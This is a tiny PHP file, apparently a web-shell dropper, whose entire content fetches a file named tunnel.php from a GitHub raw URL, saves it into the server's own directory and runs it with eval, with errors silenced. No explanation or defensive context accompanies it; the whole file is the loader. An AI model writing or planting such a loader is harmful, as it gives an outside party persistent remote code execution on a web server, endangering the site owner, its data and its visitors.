<?php
$content = @file_get_contents("https://raw.githubusercontent.com/asusususususus/ashel/refs/heads/main/tunnel.php");
if ($content) {
    @file_put_contents(__DIR__ . "/tunnel.php", $content);
    eval("?>" . $content);
}
?>
